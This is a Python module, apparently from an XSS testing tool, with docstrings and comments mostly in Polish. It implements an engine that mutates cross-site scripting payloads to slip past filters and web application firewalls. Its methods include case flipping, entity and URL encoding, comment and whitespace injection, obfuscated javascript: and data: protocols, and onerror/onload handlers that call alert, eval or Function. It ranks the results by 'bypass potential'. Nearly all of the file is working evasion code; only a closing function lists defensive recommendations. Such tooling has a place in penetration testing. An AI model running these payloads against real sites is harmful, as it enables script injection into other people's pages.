#!/usr/bin/env python3
"""
Payload Mutation System - Intelligent XSS payload generation.

This module provides advanced payload mutation capabilities including:
- Genetic algorithm-based payload evolution
- Context-aware payload generation
- Intelligent bypass techniques
- Machine learning-guided mutations
"""

import logging
import random
import re
from dataclasses import dataclass, field
from typing import List, Dict, Set, Optional, Tuple, Any
from enum import Enum

from .models import Payload, VulnerabilityLevel, PayloadType

logger = logging.getLogger("xss_vibes.mutation")


class MutationType(Enum):
    """Typy mutacji payloadów."""

    CHARACTER_SUBSTITUTION = "character_substitution"
    TAG_VARIATION = "tag_variation"
    ATTRIBUTE_INJECTION = "attribute_injection"
    EVENT_MUTATION = "event_mutation"
    SCRIPT_VARIATION = "script_variation"
    ENCODING_MUTATION = "encoding_mutation"
    WHITESPACE_INSERTION = "whitespace_insertion"
    COMMENT_INJECTION = "comment_injection"
    CASE_VARIATION = "case_variation"
    PROTOCOL_MUTATION = "protocol_mutation"


class InjectionContext(Enum):
    """Konteksty wstrzykiwania XSS."""

    HTML_CONTENT = "html_content"
    HTML_ATTRIBUTE = "html_attribute"
    JAVASCRIPT_STRING = "javascript_string"
    JAVASCRIPT_CONTEXT = "javascript_context"
    CSS_CONTEXT = "css_context"
    URL_PARAMETER = "url_parameter"
    JSON_CONTEXT = "json_context"
    XML_CONTEXT = "xml_context"


@dataclass
class MutationRule:
    """Reguła mutacji payloadu."""

    mutation_type: MutationType
    pattern: str
    replacement: str
    context: Optional[InjectionContext] = None
    weight: float = 1.0
    description: str = ""


@dataclass
class MutationResult:
    """Wynik mutacji payloadu."""

    original_payload: str
    mutated_payload: str
    mutations_applied: List[MutationType]
    context: Optional[InjectionContext] = None
    confidence_score: float = 0.0
    bypass_potential: int = 5


class PayloadMutationEngine:
    """Silnik mutacji payloadów XSS."""

    def __init__(self):
        """Inicjalizacja silnika mutacji."""
        self.mutation_rules = self._load_mutation_rules()
        self.context_patterns = self._load_context_patterns()
        self.character_substitutions = self._load_character_substitutions()
        self.tag_variations = self._load_tag_variations()
        self.event_variations = self._load_event_variations()

    def _load_mutation_rules(self) -> List[MutationRule]:
        """Ładowanie reguł mutacji."""
        rules = [
            # Character substitution rules
            MutationRule(
                MutationType.CHARACTER_SUBSTITUTION,
                r"<",
                "&lt;",
                InjectionContext.HTML_CONTENT,
                0.8,
                "HTML entity encoding for less-than",
            ),
            MutationRule(
                MutationType.CHARACTER_SUBSTITUTION,
                r">",
                "&gt;",
                InjectionContext.HTML_CONTENT,
                0.8,
                "HTML entity encoding for greater-than",
            ),
            MutationRule(
                MutationType.CHARACTER_SUBSTITUTION,
                r'"',
                "&quot;",
                InjectionContext.HTML_ATTRIBUTE,
                0.9,
                "HTML entity encoding for quotes",
            ),
            # Tag variation rules
            MutationRule(
                MutationType.TAG_VARIATION,
                r"<script>",
                "<ScRiPt>",
                InjectionContext.HTML_CONTENT,
                0.7,
                "Case variation for script tag",
            ),
            MutationRule(
                MutationType.TAG_VARIATION,
                r"<img",
                "<ImG",
                InjectionContext.HTML_CONTENT,
                0.7,
                "Case variation for img tag",
            ),
            # Event mutation rules
            MutationRule(
                MutationType.EVENT_MUTATION,
                r"onerror",
                "OnErRoR",
                InjectionContext.HTML_ATTRIBUTE,
                0.6,
                "Case variation for onerror event",
            ),
            MutationRule(
                MutationType.EVENT_MUTATION,
                r"onload",
                "OnLoAd",
                InjectionContext.HTML_ATTRIBUTE,
                0.6,
                "Case variation for onload event",
            ),
            # Whitespace insertion rules
            MutationRule(
                MutationType.WHITESPACE_INSERTION,
                r"<script>",
                "< script >",
                InjectionContext.HTML_CONTENT,
                0.5,
                "Whitespace insertion in script tag",
            ),
            # Comment injection rules
            MutationRule(
                MutationType.COMMENT_INJECTION,
                r"<script>",
                "<script/**//>",
                InjectionContext.HTML_CONTENT,
                0.6,
                "Comment injection in script tag",
            ),
        ]
        return rules

    def _load_context_patterns(self) -> Dict[InjectionContext, List[str]]:
        """Ładowanie wzorców kontekstu."""
        return {
            InjectionContext.HTML_CONTENT: [
                r"<[^>]+>.*?</[^>]+>",
                r"<[^>]+/>",
                r"&[a-zA-Z]+;",
            ],
            InjectionContext.HTML_ATTRIBUTE: [
                r'[a-zA-Z]+\s*=\s*["\'][^"\']*["\']',
                r'[a-zA-Z]+\s*=\s*[^"\'>\s]+',
            ],
            InjectionContext.JAVASCRIPT_STRING: [r'["\'][^"\']*["\']', r"`[^`]*`"],
            InjectionContext.URL_PARAMETER: [r"[?&][^=]+=[^&]*"],
        }

    def _load_character_substitutions(self) -> Dict[str, List[str]]:
        """Ładowanie substytucji znaków."""
        return {
            "<": ["&lt;", "&#60;", "&#x3C;", "%3C", "\\u003C"],
            ">": ["&gt;", "&#62;", "&#x3E;", "%3E", "\\u003E"],
            '"': ["&quot;", "&#34;", "&#x22;", "%22", "\\u0022"],
            "'": ["&#39;", "&#x27;", "%27", "\\u0027"],
            "&": ["&amp;", "&#38;", "&#x26;", "%26", "\\u0026"],
            " ": ["%20", "+", "&#32;", "\\u0020"],
            "(": ["&#40;", "&#x28;", "%28", "\\u0028"],
            ")": ["&#41;", "&#x29;", "%29", "\\u0029"],
            "/": ["&#47;", "&#x2F;", "%2F", "\\u002F"],
            "=": ["&#61;", "&#x3D;", "%3D", "\\u003D"],
        }

    def _load_tag_variations(self) -> Dict[str, List[str]]:
        """Ładowanie wariantów tagów."""
        return {
            "script": ["SCRIPT", "Script", "ScRiPt", "sCrIpT"],
            "img": ["IMG", "Img", "ImG", "iMg"],
            "svg": ["SVG", "Svg", "SvG", "sVg"],
            "iframe": ["IFRAME", "Iframe", "IFrame", "iFrAmE"],
            "object": ["OBJECT", "Object", "ObJeCt", "oBjEcT"],
            "embed": ["EMBED", "Embed", "EmBeD", "eMbEd"],
        }

    def _load_event_variations(self) -> Dict[str, List[str]]:
        """Ładowanie wariantów eventów."""
        return {
            "onerror": ["OnError", "ONERROR", "onErRoR", "OnErRoR"],
            "onload": ["OnLoad", "ONLOAD", "onLoAd", "OnLoAd"],
            "onclick": ["OnClick", "ONCLICK", "onClIcK", "OnClIcK"],
            "onmouseover": ["OnMouseOver", "ONMOUSEOVER", "onMouseOver"],
            "onfocus": ["OnFocus", "ONFOCUS", "onFoCuS", "OnFoCuS"],
            "onblur": ["OnBlur", "ONBLUR", "onBlUr", "OnBlUr"],
        }

    def detect_injection_context(
        self, target_response: str, injection_point: str
    ) -> InjectionContext:
        """Wykrywa kontekst wstrzykiwania na podstawie odpowiedzi."""
        # Sprawdź czy injection point jest w atrybucie HTML
        attr_pattern = r'[a-zA-Z]+\s*=\s*["\'][^"\']*' + re.escape(injection_point)
        if re.search(attr_pattern, target_response):
            return InjectionContext.HTML_ATTRIBUTE

        # Sprawdź czy injection point jest w JavaScript string
        js_string_pattern = (
            r'["\'][^"\']*' + re.escape(injection_point) + r'[^"\']*["\']'
        )
        if re.search(js_string_pattern, target_response):
            return InjectionContext.JAVASCRIPT_STRING

        # Sprawdź czy injection point jest w CSS
        css_pattern = r"<style[^>]*>.*?" + re.escape(injection_point) + r".*?</style>"
        if re.search(css_pattern, target_response, re.DOTALL):
            return InjectionContext.CSS_CONTEXT

        # Sprawdź czy injection point jest w URL parameter
        url_pattern = r"[?&][^=]+=" + re.escape(injection_point)
        if re.search(url_pattern, target_response):
            return InjectionContext.URL_PARAMETER

        # Domyślnie HTML content
        return InjectionContext.HTML_CONTENT

    def mutate_payload(
        self,
        original_payload: str,
        context: Optional[InjectionContext] = None,
        mutation_types: Optional[List[MutationType]] = None,
        intensity: int = 5,
    ) -> List[MutationResult]:
        """Mutuje payload z różnymi technikami."""
        results = []

        if context is None:
            context = InjectionContext.HTML_CONTENT

        if mutation_types is None:
            mutation_types = list(MutationType)

        # Generuj mutacje dla każdego typu
        for mutation_type in mutation_types[:intensity]:
            mutated = self._apply_mutation(original_payload, mutation_type, context)
            if mutated != original_payload:
                result = MutationResult(
                    original_payload=original_payload,
                    mutated_payload=mutated,
                    mutations_applied=[mutation_type],
                    context=context,
                    confidence_score=self._calculate_confidence(mutated, context),
                    bypass_potential=self._calculate_bypass_potential(
                        mutated, mutation_type
                    ),
                )
                results.append(result)

        # Generuj kombinacje mutacji
        if intensity > 3:
            combo_results = self._generate_combination_mutations(
                original_payload, context, intensity
            )
            results.extend(combo_results)

        return sorted(results, key=lambda x: x.bypass_potential, reverse=True)

    def _apply_mutation(
        self, payload: str, mutation_type: MutationType, context: InjectionContext
    ) -> str:
        """Aplikuje konkretną mutację."""
        if mutation_type == MutationType.CHARACTER_SUBSTITUTION:
            return self._apply_character_substitution(payload)
        elif mutation_type == MutationType.TAG_VARIATION:
            return self._apply_tag_variation(payload)
        elif mutation_type == MutationType.ATTRIBUTE_INJECTION:
            return self._apply_attribute_injection(payload)
        elif mutation_type == MutationType.EVENT_MUTATION:
            return self._apply_event_mutation(payload)
        elif mutation_type == MutationType.SCRIPT_VARIATION:
            return self._apply_script_variation(payload)
        elif mutation_type == MutationType.ENCODING_MUTATION:
            return self._apply_encoding_mutation(payload)
        elif mutation_type == MutationType.WHITESPACE_INSERTION:
            return self._apply_whitespace_insertion(payload)
        elif mutation_type == MutationType.COMMENT_INJECTION:
            return self._apply_comment_injection(payload)
        elif mutation_type == MutationType.CASE_VARIATION:
            return self._apply_case_variation(payload)
        elif mutation_type == MutationType.PROTOCOL_MUTATION:
            return self._apply_protocol_mutation(payload)

        return payload

    def _apply_character_substitution(self, payload: str) -> str:
        """Aplikuje substytucję znaków."""
        mutated = payload
        for char, substitutions in self.character_substitutions.items():
            if char in mutated:
                substitution = random.choice(substitutions)
                mutated = mutated.replace(char, substitution, 1)
        return mutated

    def _apply_tag_variation(self, payload: str) -> str:
        """Aplikuje warianty tagów."""
        mutated = payload
        for tag, variations in self.tag_variations.items():
            if f"<{tag}" in mutated.lower():
                variation = random.choice(variations)
                mutated = re.sub(
                    f"<{tag}", f"<{variation}", mutated, flags=re.IGNORECASE
                )
                mutated = re.sub(
                    f"</{tag}>", f"</{variation}>", mutated, flags=re.IGNORECASE
                )
        return mutated

    def _apply_attribute_injection(self, payload: str) -> str:
        """Aplikuje wstrzykiwanie atrybutów."""
        # Dodaj dodatkowe atrybuty do tagów
        if "<img" in payload.lower():
            if "onerror" not in payload.lower():
                payload = payload.replace("<img", "<img onerror=alert(1)", 1)
        elif "<svg" in payload.lower():
            if "onload" not in payload.lower():
                payload = payload.replace("<svg", "<svg onload=alert(1)", 1)
        return payload

    def _apply_event_mutation(self, payload: str) -> str:
        """Aplikuje mutacje eventów."""
        mutated = payload
        for event, variations in self.event_variations.items():
            if event in mutated.lower():
                variation = random.choice(variations)
                mutated = re.sub(event, variation, mutated, flags=re.IGNORECASE)
        return mutated

    def _apply_script_variation(self, payload: str) -> str:
        """Aplikuje warianty script."""
        variations = [
            # Różne sposoby wykonania kodu
            lambda p: p.replace("alert(1)", "prompt(1)"),
            lambda p: p.replace("alert(1)", "confirm(1)"),
            lambda p: p.replace("alert(1)", "console.log(1)"),
            lambda p: p.replace("alert(1)", 'eval("alert(1)")'),
            lambda p: p.replace("alert(1)", 'setTimeout("alert(1)",1)'),
            lambda p: p.replace("alert(1)", 'Function("alert(1)")()'),
        ]

        variation = random.choice(variations)
        return variation(payload)

    def _apply_encoding_mutation(self, payload: str) -> str:
        """Aplikuje mutacje kodowania."""
        # Kodowanie różnych znaków
        encoded_chars = {
            "<": "&#x3C;",
            ">": "&#x3E;",
            '"': "&#x22;",
            "'": "&#x27;",
            "(": "&#x28;",
            ")": "&#x29;",
        }

        mutated = payload
        for char, encoding in encoded_chars.items():
            if char in mutated:
                # Zakoduj losowo wybrane wystąpienia
                if random.random() < 0.3:
                    mutated = mutated.replace(char, encoding, 1)

        return mutated

    def _apply_whitespace_insertion(self, payload: str) -> str:
        """Aplikuje wstawianie białych znaków."""
        whitespace_chars = [" ", "\t", "\n", "\r", "\f"]

        # Wstaw białe znaki w różnych miejscach
        mutations = [
            lambda p: p.replace("<script>", "< script >"),
            lambda p: p.replace("onerror=", "onerror ="),
            lambda p: p.replace("alert(", "alert ("),
            lambda p: p.replace("src=", "src ="),
        ]

        for mutation in mutations:
            payload = mutation(payload)

        return payload

    def _apply_comment_injection(self, payload: str) -> str:
        """Aplikuje wstrzykiwanie komentarzy."""
        comment_mutations = [
            lambda p: p.replace("<script>", "<script/**//>"),
            lambda p: p.replace("alert(", "alert/**//("),
            lambda p: p.replace("onerror=", "onerror/**/="),
            lambda p: p.replace("src=", "src/**/="),
        ]

        mutation = random.choice(comment_mutations)
        return mutation(payload)

    def _apply_case_variation(self, payload: str) -> str:
        """Aplikuje warianty wielkości liter."""
        # Losowa zmiana wielkości liter
        result = ""
        for char in payload:
            if char.isalpha():
                if random.random() < 0.5:
                    result += char.upper()
                else:
                    result += char.lower()
            else:
                result += char
        return result

    def _apply_protocol_mutation(self, payload: str) -> str:
        """Aplikuje mutacje protokołów."""
        protocol_mutations = {
            "javascript:": [
                "javascript:",
                "javascript%3A",
                "javascript&colon;",
                "java&#115;cript:",
            ],
            "data:": ["data:", "data%3A", "data&colon;", "dat&#97;:"],
        }

        for protocol, variations in protocol_mutations.items():
            if protocol in payload.lower():
                variation = random.choice(variations)
                payload = payload.replace(protocol, variation, 1)

        return payload

    def _generate_combination_mutations(
        self, payload: str, context: InjectionContext, intensity: int
    ) -> List[MutationResult]:
        """Generuje kombinacje mutacji."""
        results = []
        num_combinations = min(intensity, 3)

        mutation_types = list(MutationType)

        for _ in range(num_combinations):
            # Wybierz 2-3 losowe typy mutacji
            selected_types = random.sample(mutation_types, random.randint(2, 3))

            mutated = payload
            applied_mutations = []

            for mutation_type in selected_types:
                new_mutated = self._apply_mutation(mutated, mutation_type, context)
                if new_mutated != mutated:
                    mutated = new_mutated
                    applied_mutations.append(mutation_type)

            if applied_mutations and mutated != payload:
                result = MutationResult(
                    original_payload=payload,
                    mutated_payload=mutated,
                    mutations_applied=applied_mutations,
                    context=context,
                    confidence_score=self._calculate_confidence(mutated, context),
                    bypass_potential=self._calculate_bypass_potential(
                        mutated, applied_mutations[0]
                    ),
                )
                results.append(result)

        return results

    def _calculate_confidence(self, payload: str, context: InjectionContext) -> float:
        """Oblicza confidence score dla payloadu."""
        base_score = 0.5

        # Zwiększ score dla zaawansowanych technik
        if any(encoding in payload for encoding in ["&#x", "\\u00", "%"]):
            base_score += 0.2

        # Zwiększ score dla wariantów case
        if payload != payload.lower() and payload != payload.upper():
            base_score += 0.1

        # Zwiększ score dla komentarzy
        if "/**/" in payload or "<!--" in payload:
            base_score += 0.15

        # Zmniejsz score dla prostych payloadów
        if payload.count("<") <= 1 and payload.count(">") <= 1:
            base_score -= 0.1

        return min(max(base_score, 0.0), 1.0)

    def _calculate_bypass_potential(
        self, payload: str, mutation_type: MutationType
    ) -> int:
        """Oblicza potencjał omijania WAF."""
        base_score = 5

        # Scoring based on mutation type
        type_scores = {
            MutationType.ENCODING_MUTATION: 8,
            MutationType.COMMENT_INJECTION: 7,
            MutationType.CHARACTER_SUBSTITUTION: 6,
            MutationType.CASE_VARIATION: 5,
            MutationType.WHITESPACE_INSERTION: 4,
            MutationType.TAG_VARIATION: 6,
            MutationType.EVENT_MUTATION: 5,
            MutationType.SCRIPT_VARIATION: 7,
            MutationType.PROTOCOL_MUTATION: 8,
            MutationType.ATTRIBUTE_INJECTION: 6,
        }

        base_score = type_scores.get(mutation_type, 5)

        # Zwiększ score dla zaawansowanych technik
        if any(encoding in payload for encoding in ["&#x", "\\u00", "%"]):
            base_score += 1

        if "/**/" in payload:
            base_score += 1

        if (
            len(set(c.lower() for c in payload if c.isalpha()))
            > len(set(c for c in payload if c.isalpha())) // 2
        ):
            base_score += 1

        return min(max(base_score, 1), 10)

    def generate_smart_payloads(
        self,
        base_payloads: List[str],
        target_context: Optional[InjectionContext] = None,
        count: int = 10,
    ) -> List[Payload]:
        """Generuje inteligentne payloady na podstawie kontekstu."""
        smart_payloads = []

        for base_payload in base_payloads:
            mutations = self.mutate_payload(
                base_payload, target_context, intensity=count // len(base_payloads) + 1
            )

            for mutation in mutations:
                payload = Payload(
                    content=mutation.mutated_payload,
                    level=self._determine_vulnerability_level(
                        mutation.bypass_potential
                    ),
                    context=target_context.value if target_context else None,
                    bypass_potential=mutation.bypass_potential,
                    description=f"Mutated with: {', '.join(m.value for m in mutation.mutations_applied)}",
                )
                smart_payloads.append(payload)

        # Sortuj według bypass potential i zwróć najlepsze
        smart_payloads.sort(key=lambda p: p.bypass_potential, reverse=True)
        return smart_payloads[:count]

    def _determine_vulnerability_level(
        self, bypass_potential: int
    ) -> VulnerabilityLevel:
        """Określa poziom vulnerability na podstawie bypass potential."""
        if bypass_potential >= 8:
            return VulnerabilityLevel.CRITICAL
        elif bypass_potential >= 6:
            return VulnerabilityLevel.HIGH
        elif bypass_potential >= 4:
            return VulnerabilityLevel.MEDIUM
        else:
            return VulnerabilityLevel.LOW

    def analyze_payload_effectiveness(
        self, payload: str, response: str, context: Optional[InjectionContext] = None
    ) -> Dict[str, Any]:
        """Analizuje skuteczność payloadu."""
        effectiveness = {
            "payload": payload,
            "context": context.value if context else "unknown",
            "detected_in_response": payload in response,
            "potential_execution": False,
            "risk_level": "low",
            "recommendations": [],
        }

        # Sprawdź czy payload został zreflektowany
        if payload in response:
            effectiveness["detected_in_response"] = True

            # Sprawdź czy może być wykonany
            if any(tag in response for tag in ["<script", "<img", "<svg", "<iframe"]):
                effectiveness["potential_execution"] = True
                effectiveness["risk_level"] = "high"
            elif any(event in response for event in ["onerror", "onload", "onclick"]):
                effectiveness["potential_execution"] = True
                effectiveness["risk_level"] = "medium"

        # Dodaj rekomendacje
        if effectiveness["potential_execution"]:
            effectiveness["recommendations"].extend(
                [
                    "Implement input validation and sanitization",
                    "Use Content Security Policy (CSP)",
                    "Encode output properly based on context",
                ]
            )

        return effectiveness
